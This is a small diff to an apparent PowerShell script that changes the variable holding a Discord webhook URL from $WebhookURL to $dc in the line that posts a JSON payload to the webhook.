@@ -17,4 +17,4 @@ $Payload = @{
 } | ConvertTo-Json
 
 # Send the payload to the Discord webhook
-Invoke-RestMethod -Uri $WebhookURL -Method POST -ContentType "application/json" -Body $Payload
+Invoke-RestMethod -Uri $dc -Method POST -ContentType "application/json" -Body $Payload
